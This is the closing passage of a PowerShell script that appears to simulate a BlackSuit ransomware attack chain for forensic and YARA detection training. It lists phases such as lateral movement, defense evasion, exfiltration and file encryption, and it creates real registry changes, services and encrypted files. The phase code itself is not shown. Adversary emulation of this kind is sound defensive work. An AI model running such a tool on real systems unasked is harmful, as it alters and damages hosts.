| __ )| | __ _  ____| | _/ ___ \ _  _(_) |_ 
|  _ \| |/ _` |/ ___| |/ \___ \ | || | | __|
| |_) | | (_| | |   |   < ___) | ||_| | |_ 
|____/|_|\__,_|\___|_|\_\____/ \___/|_|\__|

YARA-Detectable BlackSuit Ransomware Simulation
Based on The DFIR Report (March 31, 2025)
USE FOR EDUCATIONAL PURPOSES ONLY IN ISOLATED ENVIRONMENTS

"@ -ForegroundColor Red
    
    Write-Host "This script will simulate a BlackSuit ransomware attack by creating ACTUAL artifacts on your system." -ForegroundColor Yellow
    Write-Host "Files are designed to trigger YARA rules but contain NO ACTUAL MALWARE." -ForegroundColor Yellow
    Write-Host "THIS SHOULD ONLY BE RUN IN AN ISOLATED LAB ENVIRONMENT." -ForegroundColor Red
    Write-Host ""
    Write-Host "All artifacts will be created in: $SimulationRootPath" -ForegroundColor Cyan
    Write-Host "Simulated C2 servers: $AttackerC2IP, $SecondaryC2, $ExfilServer" -ForegroundColor Cyan
    Write-Host ""
    
    # Confirm before running
    $confirmation = Read-Host "Do you want to proceed with the simulation? Type 'YES' to confirm"
    if ($confirmation -ne "YES") {
        Write-Host "Simulation aborted. You must type 'YES' (all caps) to proceed." -ForegroundColor Red
        return
    }
    
    # Ask about cleanup preferences
    $cleanupPreference = Read-Host "Would you like to automatically clean up after the simulation? (Y/N)"
    $performCleanup = ($cleanupPreference -eq "Y")
    
    if ($performCleanup) {
        $fullCleanupPreference = Read-Host "Do you want to perform a full cleanup (removes all artifacts)? (Y/N)"
        $performFullCleanup = ($fullCleanupPreference -eq "Y")
    }
    
    # Setup environment
    Setup-Environment
    
    # Execute simulation phases
    Simulate-InitialAccess
    Simulate-C2Communications
    Simulate-LateralMovement
    Simulate-PrivilegeEscalation
    Simulate-DefenseEvasion
    Simulate-DataExfiltration
    Simulate-RansomwareDeployment
    Simulate-AntiForensics
    
    # Simulation complete
    Log-Action "BlackSuit Ransomware attack simulation completed successfully" "WARNING"
    
    Write-Host @"

============================================================
SIMULATION COMPLETED SUCCESSFULLY
============================================================
All artifacts have been created for forensic analysis.

The simulation includes:
- YARA-detectable simulated malware files
- Evidence of all commands from the DFIR report
- Realistic forensic artifacts across the system
- External C2 addresses ($AttackerC2IP, $SecondaryC2, $ExfilServer)
- Full attack chain from initial access to ransomware
- Registry modifications, services, scheduled tasks
- Simulated data exfiltration
- Encrypted files with .blacksuit extension
- Anti-forensics evidence

You can now analyze these artifacts using forensic tools.
============================================================

"@ -ForegroundColor Green
    
    # Cleanup if requested
    if ($performCleanup) {
        Write-Host ""
        Write-Host "Starting cleanup process..." -ForegroundColor Yellow
        
        if ($performFullCleanup) {
            Cleanup-Simulation -FullCleanup
            Write-Host "Full cleanup completed. All simulation artifacts have been removed." -ForegroundColor Green
        }
        else {
            Cleanup-Simulation
            Write-Host "Basic cleanup completed. Major system changes have been reverted, but analysis artifacts remain in $SimulationRootPath" -ForegroundColor Green
        }
    }
    else {
        Write-Host ""
        Write-Host "No cleanup performed. You can analyze the artifacts now." -ForegroundColor Yellow
        Write-Host "To clean up later, run the script again and choose the cleanup option, or manually remove the artifacts." -ForegroundColor Yellow
    }
}

# Run the simulation
Simulate-BlackSuitAttack